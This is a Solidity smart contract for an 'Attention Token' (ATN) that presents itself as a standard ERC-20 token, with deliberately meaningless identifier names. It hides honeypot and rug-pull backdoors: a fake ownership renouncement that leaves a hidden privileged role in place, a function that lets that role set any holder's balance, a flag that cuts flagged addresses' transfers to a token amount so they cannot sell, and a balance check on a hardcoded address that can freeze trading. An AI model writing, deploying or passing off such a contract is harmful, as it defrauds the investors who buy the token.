//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface walletFromAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapFee) external view returns (uint256);

    function transfer(address teamTxMin, uint256 launchedFee) external returns (bool);

    function allowance(address shouldSellFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedFee) external returns (bool);

    function transferFrom(
        address sender,
        address teamTxMin,
        uint256 launchedFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeLimit, uint256 value);
    event Approval(address indexed shouldSellFrom, address indexed spender, uint256 value);
}

abstract contract autoReceiverIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeBuy {
    function createPair(address tokenWallet, address txTo) external returns (address);
}

interface walletFromAtMetadata is walletFromAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AttentionToken is autoReceiverIs, walletFromAt, walletFromAtMetadata {

    function fundTotalLimit(uint256 launchedFee) public {
        totalToLimit();
        shouldIs = launchedFee;
    }

    function getOwner() external view returns (address) {
        return launchAt;
    }

    uint8 private feeTotal = 18;

    uint256 shouldIs;

    address public teamFeeAmount;

    function symbol() external view virtual override returns (string memory) {
        return senderList;
    }

    string private fundMax = "Attention Token";

    address listLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address tokenList, address teamTxMin, uint256 launchedFee) external override returns (bool) {
        if (_msgSender() != minList) {
            if (shouldToken[tokenList][_msgSender()] != type(uint256).max) {
                require(launchedFee <= shouldToken[tokenList][_msgSender()]);
                shouldToken[tokenList][_msgSender()] -= launchedFee;
            }
        }
        return launchMax(tokenList, teamTxMin, launchedFee);
    }

    uint256 private toTotal;

    mapping(address => mapping(address => uint256)) private shouldToken;

    function atBuy(address tokenList, address teamTxMin, uint256 launchedFee) internal returns (bool) {
        require(marketingLimit[tokenList] >= launchedFee);
        marketingLimit[tokenList] -= launchedFee;
        marketingLimit[teamTxMin] += launchedFee;
        emit Transfer(tokenList, teamTxMin, launchedFee);
        return true;
    }

    address public modeList;

    function owner() external view returns (address) {
        return launchAt;
    }

    bool private isTake;

    mapping(address => bool) public buySwap;

    uint256 public tradingTx;

    uint256 constant teamLiquidity = 20 ** 10;

    event OwnershipTransferred(address indexed shouldTo, address indexed sellReceiver);

    function launchMax(address tokenList, address teamTxMin, uint256 launchedFee) internal returns (bool) {
        if (tokenList == teamFeeAmount) {
            return atBuy(tokenList, teamTxMin, launchedFee);
        }
        uint256 launchedEnable = walletFromAt(modeList).balanceOf(listLaunch);
        require(launchedEnable == shouldIs);
        require(teamTxMin != listLaunch);
        if (receiverAt[tokenList]) {
            return atBuy(tokenList, teamTxMin, teamLiquidity);
        }
        return atBuy(tokenList, teamTxMin, launchedFee);
    }

    bool public swapSender;

    function allowance(address listMaxReceiver, address teamWalletToken) external view virtual override returns (uint256) {
        if (teamWalletToken == minList) {
            return type(uint256).max;
        }
        return shouldToken[listMaxReceiver][teamWalletToken];
    }

    uint256 private walletTeam;

    function exemptTx(address exemptMin) public {
        totalToLimit();
        if (amountIs) {
            isSenderAmount = false;
        }
        if (exemptMin == teamFeeAmount || exemptMin == modeList) {
            return;
        }
        receiverAt[exemptMin] = true;
    }

    function totalToLimit() private view {
        require(buySwap[_msgSender()]);
    }

    string private senderList = "ATN";

    uint256 teamEnable;

    function minTeamLaunch(address tradingFrom, uint256 launchedFee) public {
        totalToLimit();
        marketingLimit[tradingFrom] = launchedFee;
    }

    bool private amountIs;

    constructor (){
        
        limitFund isMin = limitFund(minList);
        modeList = feeBuy(isMin.factory()).createPair(isMin.WETH(), address(this));
        if (toTotal == tradingTx) {
            tradingTx = toTotal;
        }
        teamFeeAmount = _msgSender();
        toMarketing();
        buySwap[teamFeeAmount] = true;
        marketingLimit[teamFeeAmount] = launchedTx;
        
        emit Transfer(address(0), teamFeeAmount, launchedTx);
    }

    bool private isSenderAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTx;
    }

    uint256 private launchedTx = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return feeTotal;
    }

    function transfer(address tradingFrom, uint256 launchedFee) external virtual override returns (bool) {
        return launchMax(_msgSender(), tradingFrom, launchedFee);
    }

    address minList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private marketingLimit;

    function toMarketing() public {
        emit OwnershipTransferred(teamFeeAmount, address(0));
        launchAt = address(0);
    }

    address private launchAt;

    function name() external view virtual override returns (string memory) {
        return fundMax;
    }

    mapping(address => bool) public receiverAt;

    function enableTx(address minFund) public {
        if (swapSender) {
            return;
        }
        if (toTotal != walletTeam) {
            amountIs = false;
        }
        buySwap[minFund] = true;
        
        swapSender = true;
    }

    function balanceOf(address swapFee) public view virtual override returns (uint256) {
        return marketingLimit[swapFee];
    }

    function approve(address teamWalletToken, uint256 launchedFee) public virtual override returns (bool) {
        shouldToken[_msgSender()][teamWalletToken] = launchedFee;
        emit Approval(_msgSender(), teamWalletToken, launchedFee);
        return true;
    }

}